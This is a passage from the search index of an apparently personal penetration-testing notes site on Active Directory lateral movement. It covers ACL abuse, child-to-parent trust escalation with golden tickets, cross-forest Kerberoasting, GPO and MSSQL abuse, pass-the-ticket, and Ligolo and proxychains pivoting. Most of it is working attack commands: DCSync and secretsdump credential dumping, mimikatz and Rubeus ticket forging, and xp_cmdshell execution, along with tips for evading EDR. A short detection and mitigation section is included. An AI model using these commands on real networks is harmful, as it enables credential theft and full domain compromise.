-Verbose\n</code></pre></p>","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Domain%20ACLs/#genericwrite-on-user","title":"GenericWrite on User","text":"","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Domain%20ACLs/#targeted-kerberoasting","title":"Targeted Kerberoasting","text":"<p>Set SPN (if you're running a process as the user with GenericWrite) <pre><code>setspn -a domain.local/user.domain.local:1337 domain.local\\user\n</code></pre></p> <p>If your're running as different user</p> <p>Import-Module .\\Powerview.ps1 $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('object.local\\smith', $SecPassword)</p> <p>Set-DomainObject -Credential $Cred -Identity maria -SET @{serviceprincipalname='foobar/xd'}</p>","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Domain%20ACLs/#change-users-logon-scripts","title":"Change users logon scripts","text":"<p>Global writeable location <pre><code>cd C:\\programdata\\\necho 'whoami &gt; C:\\programdata\\out.txt' &gt; test.ps1\n\nSet-DomainObject -Identity &lt;targetuser&gt; -SET @{scriptpath='C:\\programdata\\test.ps1'}\n</code></pre> check if it worked <pre><code>net user &lt;target user&gt;\n</code></pre></p>","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Forest%20%26%20Domain%20Trusts/","title":"Forest & Domain Trusts","text":"","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Forest%20%26%20Domain%20Trusts/#overview","title":"Overview","text":"<p>A trust is used to establish forest-forest or domain-domain (intra-domain) authentication, which allows users to access resources in (or perform administrative tasks) another domain, outside of the main domain where their account resides.</p> <ul> <li><code>Parent-child</code>: Two or more domains within the same forest. The child domain has a two-way transitive trust with the parent domain, meaning that users in the child domain <code>corp.inlanefreight.local</code> could authenticate into the parent domain <code>inlanefreight.local</code>, and vice-versa.</li> <li><code>Cross-link</code>: A trust between child domains to speed up authentication.</li> <li><code>External</code>: A non-transitive trust between two separate domains in separate forests which are not already joined by a forest trust. This type of trust utilizes SID filtering or filters out authentication requests (by SID) not from the trusted domain.</li> <li> <p><code>Tree-root</code>: A two-way transitive trust between a forest root domain and a new tree root domain. They are created by design when you set up a new tree root domain within a forest.  </p> </li> <li> <p><code>Forest</code>: A transitive trust between two forest root domains.</p> </li> <li>ESAE: A bastion forest used to manage Active Directory. Trusts can be transitive or non-transitive.</li> <li>A <code>transitive</code> trust means that trust is extended to objects that the child domain trusts. For example, let's say we have three domains. In a transitive relationship, if <code>Domain A</code> has a trust with <code>Domain B</code>, and <code>Domain B</code> has a <code>transitive</code> trust with <code>Domain C</code>, then <code>Domain A</code> will automatically trust <code>Domain C</code>.</li> <li>In a <code>non-transitive trust</code>, the child domain itself is the only one trusted.</li> </ul> Transitive Non-Transitive Shared, 1 to many Direct trust The trust is shared with anyone in the forest Not extended to next level child domains Forest, tree-root, parent-child, and cross-link trusts are transitive Typical for external or custom trust setups <p>one-way or two-way (bidirectional). - <code>One-way trust</code>: Users in a <code>trusted</code> domain can access resources in a trusting domain, not vice-versa. - <code>Bidirectional trust</code>: Users from both trusting domains can access resources in the other domain. For example, in a bidirectional trust between <code>INLANEFREIGHT.LOCAL</code> and <code>FREIGHTLOGISTICS.LOCAL</code>, users in <code>INLANEFREIGHT.LOCAL</code> would be able to access resources in <code>FREIGHTLOGISTICS.LOCAL</code>, and vice-versa.</p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Forest%20%26%20Domain%20Trusts/#identify","title":"Identify","text":"<p>Remote <pre><code>nxc ldap &lt;ip&gt; -u user -p pass -M enum_trusts\n</code></pre> Local <pre><code>Import-Module activedirectory\nGet-ADTrust -Filter *\n</code></pre> <pre><code>netdom query /domain:inlanefreight.local trust\n</code></pre> Find DC <pre><code>netdom query /domain:inlanefreight.local dc\n</code></pre> Find other machines <pre><code>netdom query /domain:inlanefreight.local workstation\n</code></pre></p> <p>Enum users in child domain <pre><code>Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Forest%20%26%20Domain%20Trusts/#child-parent-trusts-from-windows","title":"Child -&gt; Parent Trusts from Windows","text":"","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Forest%20%26%20Domain%20Trusts/#sidhistory-attribute","title":"sidHistory attribute","text":"<p>If a user in one domain is migrated to another domain, a new account is created in the second domain. The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain. - If child domain has been compromised, this will allow you to move into parent domain - if a user in a child domain that has their sidHistory set to the Enterprise Admins group (which only exists in the parent domain), they are treated as a member of this group, which allows for administrative access to the entire forest.</p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Forest%20%26%20Domain%20Trusts/#attack-requirements","title":"Attack Requirements","text":"<ul> <li>The KRBTGT hash for the child domain</li> <li>The SID for the child domain</li> <li>The name of a target user in the child domain (does not need to exist!)</li> <li>The FQDN of the child domain.</li> <li>The SID of the Enterprise Admins group of the root domain.</li> <li>With this data collected, the attack can be performed with Mimikatz. Obtain KRBTGT for child domain <pre><code>mimikatz # lsadump::dcsync /user:CHILD\\krbtgt\n</code></pre> Get SID for child domain <pre><code>Get-DomainSID\n</code></pre> Get SID of Enterprise Admins group of root domain <pre><code>Get-DomainGroup -Domain DOMAIN.LOCAL -Identity \"Enterprise Admins\" | select distinguishedname,objectsid\n# or with ad module\n Get-ADGroup -Identity \"Enterprise Admins\" -Server \"DOMAIN.LOCAL\"\n</code></pre> FQDN of the child <pre><code>Get-ADDomain\n</code></pre> Create Golden Ticket with Mimikatz <pre><code>mimikatz # kerberos::golden /user:hacker /domain:CHILD.DOMAIN.LOCAL /sid:&lt;SID-OF-CHILD-DOMAIN&gt; /krbtgt:&lt;KRBTGTHASH&gt; /sids:&lt;SID-of-Enterperise-Admins-gropup-of-root-domain&gt; /ptt\n</code></pre> Create Golden Ticket with Rubeus <pre><code>.\\Rubeus.exe golden /rc4:&lt;KRBTGT-HASH&gt; /domain:CHILD.DOMAIN.LOCAL /sid:&lt;SID-OF-CHILD-DOMAIN&gt;  /sids:&lt;SID-of-Enterperise-Admins-gropup-of-root-domain&gt; /user:hacker /ptt\n</code></pre> DCSync <pre><code>mimikatz # lsadump::dcsync /user:DOMAIN\\lab_adm\n</code></pre> If our target domain is not the same as the user's domain, we will need to specify the exact domain to perform the DCSync operation on the particular domain controller <pre><code>mimikatz # lsadump::dcsync /user:DOMAIN\\lab_adm /domain:DOMAIN.LOCAL\n</code></pre></li> </ul>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Forest%20%26%20Domain%20Trusts/#child-parent-trusts-from-linux","title":"Child -&gt; Parent Trusts from Linux","text":"<p><pre><code>impacket-secretsdump child.domain.local/&lt;owned_user&gt;@&lt;DCIP&gt; -just-dc-user CHILD/krbtgt\n</code></pre> <pre><code>lookupsid.py child.domain.local/&lt;owned_user&gt;@&lt;dcip&gt; | grep \"Domain SID\"\n</code></pre> <pre><code>lookupsid.py child.domain.local/&lt;owned_user&gt;@&lt;target-dc-ip&gt; | grep -B12 \"Enterprise Admins\"\n</code></pre> request ticket <pre><code>impacket-ticketer -nthash &lt;krbtgthash&gt; -domain CHILD.DOMAIN.LOCAL -domain-sid &lt;CHILD DOMAIN SID&gt; -extra-sid &lt;enterprise-admins-sid&gt; hacker\n</code></pre> <pre><code>export KRB5CCNAME=hacker.ccache \n</code></pre> <pre><code>impacket-psexec CHILD.DOMAIN.LOCAL/hacker@dc01.domain.local -k -no-pass -target-ip &lt;dc-ip&gt;\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Forest%20%26%20Domain%20Trusts/#automated-attack","title":"Automated attack","text":"<pre><code>raiseChild.py -target-exec &lt;target-dc&gt; child.domain.local/lab_adm\n</code></pre>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Forest%20%26%20Domain%20Trusts/#cross-forest-trust-abuse-from-windows","title":"Cross-Forest Trust Abuse - from Windows","text":"<p>Cross-Forest Kerberoasting depending on the trust direction. In a situation where you are positioned in a domain with either an inbound or bidirectional domain/forest trust, you can likely perform various attacks to gain a foothold <pre><code>Get-DomainUser -SPN -Domain DOMAIN2.LOCAL | select SamAccountName\n</code></pre> <pre><code>Get-DomainUser -Domain DOMAIN2.LOCAL -Identity sqlsvc |select samaccountname,memberof\n</code></pre> <pre><code>.\\Rubeus.exe kerberoast /domain:DOMAIN2.LOCAL /user:sqlsvc /nowrap\n</code></pre> Admin Password Re-Use &amp; Group Membership <pre><code>Get-DomainForeignGroupMember -Domain DOMAIN2.LOCAL\n</code></pre> <pre><code>Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500\n</code></pre> <pre><code>Enter-PSSession -ComputerName DC03.DOMAIN2.LOCAL -Credential DOMAIN\\administrator\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Forest%20%26%20Domain%20Trusts/#attacking-domain-trusts-cross-forest-trust-abuse-from-linux","title":"Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux","text":"<p>Cross-Forest Kerberoasting</p> <p>note</p> <p>To do this, we need credentials for a user that can authenticate into the other domain and specify the <code>-target-domain</code> flag in our command</p> <pre><code>impacket-GetUserSPNs -request -target-domain DOMAIN2.LOCAL DOMAIN.LOCAL/user\n</code></pre> <p>it could also be worth attempting a single password spray with the cracked password, as there is a possibility that it could be used for other service accounts if the same admins are in charge of both domains. Here, we have yet another example of iterative testing and leaving no stone unturned</p> <p>Hunting Foreign Group Membership with Bloodhound-python add to resolv.conf so we can resolv DNS entries for first domain <pre><code>cat /etc/resolv.conf \n# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)\n#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN\n# 127.0.0.53 is the systemd-resolved stub resolver.\n# run \"resolvectl status\" to see details about the actual nameservers.\n\\#nameserver 1.1.1.1\n\\#nameserver 8.8.8.8\ndomain DOMAIN.LOCAL\nnameserver 172.16.5.5\n</code></pre> Run bloodhound <pre><code>bloodhound-python -d DOMAIN.LOCAL -dc DC01 -c All -u &lt;user&gt; -p &lt;pass&gt;\n</code></pre> add resolv.conf entries for second forest <pre><code>cat /etc/resolv.conf \n# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)\n#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN\n# 127.0.0.53 is the systemd-resolved stub resolver.\n# run \"resolvectl status\" to see details about the actual nameservers.\n\\#nameserver 1.1.1.1\n\\#nameserver 8.8.8.8\ndomain DOMAIN2.LOCAL\nnameserver 172.16.5.238\n</code></pre> Run bloodhound <pre><code>bloodhound-python -d DOMAIN2.LOCAL -dc DC02.DOMNAIN2.LOCAL -c All -u user@DOMAIN.local -p 'pass'\n</code></pre> upload to bloodhound, click on <code>Users with Foreign Domain Group Membership</code> under the <code>Analysis</code> tab and select the source domain as <code>DOMAIN.LOCAL</code>.</p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Group%20Policy%20Abuse/","title":"Group Policy Abuse","text":"","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Group%20Policy%20Abuse/#identify","title":"Identify","text":"<p><pre><code>Get-GPO -All | Select DisplayName\n</code></pre> Check if group has control <pre><code>$sid=Convert-NameToSid \"Domain Users\"\nGet-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}\n</code></pre> Converting GPO GUID to Name <pre><code>Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532\n</code></pre> group3r https://github.com/Group3r/Group3r <pre><code>group3r.exe -f &lt;filepath-name.log&gt; \n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Group%20Policy%20Abuse/#in-bloodhound","title":"In BloodHound","text":"<p>Checking in BloodHound, we can see that the <code>Domain Users</code> group has several rights over the <code>Disconnect Idle RDP</code> GPO, which could be leveraged for full control of the object.</p> <p>If we select the GPO in BloodHound and scroll down to <code>Affected Objects</code> on the <code>Node Info</code> tab, we can see that this GPO is applied to one OU, which contains four computer objects.</p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Group%20Policy%20Abuse/#exploit","title":"Exploit","text":"<p>https://github.com/FSecureLABS/SharpGPOAbuse We could use a tool such as SharpGPOAbuse to take advantage of this GPO misconfiguration by performing actions such as adding a user that we control to the local admins group on one of the affected hosts, creating an immediate scheduled task on one of the hosts to give us a reverse shell, or configure a malicious computer startup script to provide us with a reverse shell or similar.</p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Kerberos%20Double%20Hop/","title":"Kerberos Double Hop","text":"","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Kerberos%20Double%20Hop/#explainer","title":"Explainer","text":"<p>If you\u2019re accessing a resource with network authentication, like winrm, your creds may not be cached in memory. Because of this, actions you take that you have permissions to take may be denied. The DC cannot recognize your access rights.</p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Kerberos%20Double%20Hop/#workarounds","title":"Workarounds","text":"","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Kerberos%20Double%20Hop/#1-use-invoke-command-to-pass-a-pscredential-object-with-every-request","title":"1. Use Invoke-Command to pass a PSCredential object with every request","text":"<p><pre><code>$SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\\user', $SecPassword)\n</code></pre> <pre><code>Import-Module powerview.ps1\nget-domainuser -spn -credential $Cred | select samaccountname\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Kerberos%20Double%20Hop/#2-register-pssession-configuration-from-windows","title":"2. Register PSSession Configuration (from windows)","text":"<p><pre><code>Register-PSSessionConfiguration -Name &lt;namethesessionyhere&gt; -RunAsCredential domain\\user\n</code></pre> <pre><code>Restart-Service WinRM\n</code></pre> <pre><code>Enter-PSSession -ComputerName computer01 -Credential domain\\user -ConfigurationName &lt;whateveryouanemdthesession&gt;\n</code></pre></p> <p>Note: We cannot use Register-PSSessionConfiguration from an evil-winrm shell because we won't be able to get the credentials popup. Furthermore, if we try to run this by first setting up a PSCredential object and then attempting to run the command by passing credentials like -RunAsCredential $Cred, we will get an error because we can only use RunAs from an elevated PowerShell terminal.</p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/MSSQL%20Abuse/","title":"MSSQL Abuse","text":"","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/MSSQL%20Abuse/#identify","title":"Identify","text":"<p>https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet <pre><code>Import-Module .\\PowerUpSQL.ps1\nGet-SQLInstanceDomain\n</code></pre> Connect - Windows <pre><code>Get-SQLQuery -Verbose -Instance \"host,port\" -username \"domain.local\\\\user\" -password \"password\" -query 'Select @@version'\n</code></pre> Connect - Linux <pre><code>impacket-mssqlclient user:'pass'@&lt;IP&gt; -windows-auth\n</code></pre></p>","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/MSSQL%20Abuse/#exploit","title":"Exploit","text":"<p>Run commands with xp_cmdshell <pre><code>SQL&gt; enable_xp_cmdshell\nxp_cmdshell whoami /priv\n</code></pre></p>","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Pass%20The%20Ticket/","title":"Pass The Ticket","text":"","tags":["Authenticated","Elevated","Kerberos","Lateral-Movement","AD","type/technique","tactic/TA0008","technique/T1550003","stage/lateral-movement","os/windows","tool/rubeus","tool/klist"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Pass%20The%20Ticket/#technique","title":"Technique","text":"<p>Pass-the-Ticket (PtT) is a lateral movement technique that uses a stolen Kerberos ticket to authenticate to systems and access resources as the impersonated user. This attack bypasses the need to extract credentials from protected processes like LSASS, making it effective in hardened environments where credential dumping is monitored or prevented.</p> <p>The attack leverages a stolen Ticket Granting Ticket (TGT) or a service ticket (TGS). An attacker can use this ticket from a different machine to request new service tickets from the Domain Controller and gain access to network resources, effectively impersonating the user without ever knowing their password.</p>","tags":["Authenticated","Elevated","Kerberos","Lateral-Movement","AD","type/technique","tactic/TA0008","technique/T1550003","stage/lateral-movement","os/windows","tool/rubeus","tool/klist"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Pass%20The%20Ticket/#prerequisites","title":"Prerequisites","text":"<p>Access Level: Administrative rights are required on the source machine to dump Kerberos tickets from memory, as they belong to other users' logon sessions.</p> <p>System State: The attacker must have a foothold on a domain-joined machine where a target user is currently logged in or has an active Kerberos ticket cached.</p> <p>Information: The attacker needs to identify a valid Kerberos ticket in memory to steal.</p> <p>Misc: Your system time must be synced with the DC. If your time is too skewed, the ticket will be considered invalid.</p>","tags":["Authenticated","Elevated","Kerberos","Lateral-Movement","AD","type/technique","tactic/TA0008","technique/T1550003","stage/lateral-movement","os/windows","tool/rubeus","tool/klist"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Pass%20The%20Ticket/#considerations","title":"Considerations","text":"<p>Impact</p> <p>Successful PtT allows an attacker to move laterally across the network and access any resources the impersonated user has permissions for. If the stolen ticket belongs to a Domain Administrator, the attacker gains full control over the domain.</p> <p>DANGER</p> <p>Sacrificial Processes: It is critical to inject stolen tickets into a \"sacrificial process\" rather than overwriting the ticket of an existing logon session. Overwriting a ticket for a critical process (like <code>SYSTEM$</code>) or a service can cause an outage, as the service may not be able to re-authenticate until it is restarted. Using a sacrificial process creates a new, isolated logon session for the ticket. While this is safer, creating a new logon session (<code>LOGON_TYPE = 9</code>) is an Indicator of Compromise (IOC) that can be detected.</p> <p>OPSEC</p> <ul> <li> <p>Tooling Footprint: Executing tools like <code>Rubeus.exe</code> from disk creates obvious IOCs (process name, file hash, arguments) for EDR. Prefer in-memory execution or integrated C2 capabilities to avoid detection.</p> </li> <li> <p>Logon Artifacts: Creating a sacrificial process generates a detectable <code>LOGON_TYPE = 9</code> event. This is a direct trade-off between preventing service outages and maintaining stealth.</p> </li> <li> <p>Suspicious Service Requests: After passing a ticket, the host's requests for new service tickets can appear abnormal.</p> </li> </ul>","tags":["Authenticated","Elevated","Kerberos","Lateral-Movement","AD","type/technique","tactic/TA0008","technique/T1550003","stage/lateral-movement","os/windows","tool/rubeus","tool/klist"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Pass%20The%20Ticket/#execution","title":"Execution","text":"<p>Create a Sacrificial Process</p> <p>To avoid overwriting existing tickets and potentially causing service disruptions, create a new process with its own logon session. Rubeus can create this process, which will be used for ticket injection. The <code>/show</code> flag makes the new command window visible.</p> <p><pre><code>.\\Rubeus.exe createnetonly /program:\"C:\\Windows\\System32\\cmd.exe\" /show\n</code></pre> The output provides the Logon ID (LUID) of the new session. Save this for later.</p> <p>Identify TIckets (In original session)</p> <pre><code>.\\Rubeus.exe triage\n</code></pre> <p>Once a target ticket is identified (e.g., a ticket for <code>admin@DOMAIN.LOCAL</code> with the service <code>krbtgt</code>), save its LUID.</p> <p>Dump the target ticket with its LUID (In original session)</p> <pre><code>.\\Rubeus.exe dump /luid:0x89275d /service:krbtgt /nowrap\n</code></pre> <p>This command outputs the user's ticket in Base64 format.</p> <p>Pass the Ticket (PTT) (In Sacrificial Process)</p> <p>inject the stolen ticket into the current logon session. The <code>/ptt</code> flag passes the ticket directly into memory.</p> <pre><code>Rubeus.exe renew /ticket:doIFVjCCBVKgAwIBBaEDA&lt;SNIP&gt; /ptt\n</code></pre> <p>Rerun <code>klist</code> to confirm that the ticket for the target user is now in our current session.</p> <pre><code>klist\n</code></pre> <p>The output should now show the impersonated user's ticket. With this ticket in memory, any network action you perform will be on behalf of that user. For example, accessing a Domain Controller's C$ share.</p> <p><pre><code>dir \\\\dc01\\c$\n</code></pre> Windows will automatically use the injected TGT to request a TGS for the <code>cifs/dc01</code> service and grant you access.</p>","tags":["Authenticated","Elevated","Kerberos","Lateral-Movement","AD","type/technique","tactic/TA0008","technique/T1550003","stage/lateral-movement","os/windows","tool/rubeus","tool/klist"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Pass%20The%20Ticket/#cleanup-considerations","title":"Cleanup Considerations","text":"<p>Terminating the sacrificial process will destroy the associated logon session and the injected tickets.</p>","tags":["Authenticated","Elevated","Kerberos","Lateral-Movement","AD","type/technique","tactic/TA0008","technique/T1550003","stage/lateral-movement","os/windows","tool/rubeus","tool/klist"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Pass%20The%20Ticket/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["Authenticated","Elevated","Kerberos","Lateral-Movement","AD","type/technique","tactic/TA0008","technique/T1550003","stage/lateral-movement","os/windows","tool/rubeus","tool/klist"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Pass%20The%20Ticket/#detection","title":"Detection","text":"<ul> <li> <p>Monitor for process creation events associated with <code>LOGON_TYPE = 9</code> (New Credentials), which tools like Rubeus use to create sacrificial processes.</p> </li> <li> <p>Audit for Kerberos service ticket requests (Event ID 4769) originating from unusual hosts or at anomalous times.</p> </li> <li> <p>Network traffic analysis can potentially identify a ticket being used from an IP address not associated with the legitimate user.</p> </li> </ul>","tags":["Authenticated","Elevated","Kerberos","Lateral-Movement","AD","type/technique","tactic/TA0008","technique/T1550003","stage/lateral-movement","os/windows","tool/rubeus","tool/klist"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Pass%20The%20Ticket/#mitigation","title":"Mitigation","text":"<ul> <li> <p>Limit Admin Privileges: Restricting local administrator rights prevents attackers from being able to dump tickets from other users' sessions on a machine.</p> </li> <li> <p>Protected Users Group: Add high-privilege accounts to the \"Protected Users\" group in Active Directory. This enforces security controls that make it much harder to steal or use their tickets, such as disabling credential caching.</p> </li> <li> <p>Microsoft Defender for Identity: Can detect anomalous ticket usage across the network, which is a key indicator of a Pass-the-Ticket attack.</p> </li> </ul>","tags":["Authenticated","Elevated","Kerberos","Lateral-Movement","AD","type/technique","tactic/TA0008","technique/T1550003","stage/lateral-movement","os/windows","tool/rubeus","tool/klist"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Pivoting/","title":"Pivoting","text":"","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Pivoting/#ligolong","title":"LigoloNG","text":"<p>https://github.com/Nicocha30/ligolo-ng</p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Pivoting/#single-pivot","title":"Single pivot","text":"<p>Attack host: <pre><code>sudo ip tuntap add user kali mode tun ligolo ; sudo ip link set ligolo up\n</code></pre> <pre><code>./proxy -selfcert -laddr 0.0.0.0:443\n</code></pre> add route to new subnet <pre><code>sudo ip route add 172.16.139.0/24 dev ligolo\n</code></pre> Target: <pre><code>agent.exe -connect &lt;attackIP&gt;:443 -ignore-cert\n</code></pre> Attack host: select session <pre><code>session\n</code></pre> add listeners <pre><code>listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80\nlistener_add --addr 0.0.0.0:8081 --to 127.0.0.1:81\nlistener_add --addr 0.0.0.0:8082 --to 127.0.0.1:82\nlistener_add --addr 0.0.0.0:8083 --to 127.0.0.1:83\nlistener_add --addr 0.0.0.0:8084 --to 127.0.0.1:84\n</code></pre> start tunnel <pre><code>start\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Pivoting/#double-pivot","title":"Double Pivot","text":"<p>Attack host: <pre><code>sudo ip tuntap add user kali mode tun double ; sudo ip link set double up\nsudo ip tuntap add user kali mode tun ligolo ; sudo ip link set ligolo up\n</code></pre> <pre><code>./proxy -selfcert -laddr 0.0.0.0:443\n</code></pre> Target: First pivot callback <pre><code>agent.exe -connect &lt;attackIP&gt;:443 -ignore-cert\n</code></pre> Attack host: Add routes <pre><code>sudo ip route add 172.16.139.0/24 dev ligolo\nsudo ip route add 172.16.210.0/24 dev double\n</code></pre> select session <pre><code>session\n</code></pre> add listener for second pivot <pre><code>listener_add --addr 0.0.0.0:139 --to 127.0.0.1:443\n</code></pre> add normal listeners <pre><code>listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80\nlistener_add --addr 0.0.0.0:8081 --to 127.0.0.1:81\nlistener_add --addr 0.0.0.0:8082 --to 127.0.0.1:82\nlistener_add --addr 0.0.0.0:8083 --to 127.0.0.1:83\nlistener_add --addr 0.0.0.0:8084 --to 127.0.0.1:84\n</code></pre> start first tunnel <pre><code>start\n</code></pre> Second target: Call back to first pivot host from second <pre><code>agent.exe -connect &lt;targetONE&gt;:139 -ignore-cert\n</code></pre> add listeners to second host <pre><code>listener_add --addr 0.0.0.0:5050 --to 127.0.0.1:50\nlistener_add --addr 0.0.0.0:5051 --to 127.0.0.1:51\nlistener_add --addr 0.0.0.0:5052 --to 127.0.0.1:52\nlistener_add --addr 0.0.0.0:5053 --to 127.0.0.1:53\nlistener_add --addr 0.0.0.0:5054 --to 127.0.0.1:54\n</code></pre> start second tunnell <pre><code>start --tun double\n</code></pre> Verify access <pre><code>nxc smb 172.16.139.10/24 \nnxc smb 172.16.210.0/24\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Pivoting/#proxychains-with-socks-tunnel","title":"proxychains (with SOCKS tunnel)","text":"<p>Start with dynamic SSH port forward <pre><code>ssh -D 9050 user@&lt;jumpIP&gt;\n</code></pre> Check proxychains configuration <pre><code>cat /etc/proxychains.conf\nor\ncat /etc/proxychains4.conf\n</code></pre> Ensure its configured to route over the local forward <pre><code># meanwile\n# defaults set to \"tor\"\nsocks4  127.0.0.1 9050\n</code></pre> prepend <code>proxychains</code> or <code>proxychains4</code> to any command to tunnel the traffic <pre><code>proxychains nmap\nproxychain msfconsole\nproxychains firefox\n</code></pre></p> <p>we can only perform a full TCP connect scan over proxychains. The reason for this is that proxychains cannot understand partial packets. If you send partial packets like half connect scans, it will return incorrect results</p> <pre><code>proxychains nmap -v -Pn -sT &lt;internalIP&gt;\n</code></pre>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Pivoting/#sshuttle","title":"sshuttle","text":"<p>https://github.com/sshuttle/sshuttle</p> <p>specify the option <code>-r</code> to connect to the remote machine with a username and password. Then we need to include the network or IP we want to route through <pre><code>sudo sshuttle -r user@&lt;jumpHost&gt; 172.16.5.0/23 -v \n</code></pre> sshuttle creates an entry in our <code>iptables</code> to redirect all traffic to the 172.16.5.0/23 network through the pivot host. We can now use any tool directly without using proxychains. <pre><code>nmap -v -sV 172.16.5.19 -A -Pn\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Resource-Based%20Constrained%20Delegation/","title":"Resource Based Constrained Delegation","text":"","tags":["Authenticated","Elevated","Kerberos","msDS-AllowedToActOnBehalfOfOtherIdentity","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Resource-Based%20Constrained%20Delegation/#linux","title":"Linux","text":"","tags":["Authenticated","Elevated","Kerberos","msDS-AllowedToActOnBehalfOfOtherIdentity","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Resource-Based%20Constrained%20Delegation/#with-nxc","title":"With nxc","text":"<p>impersonate administrator given 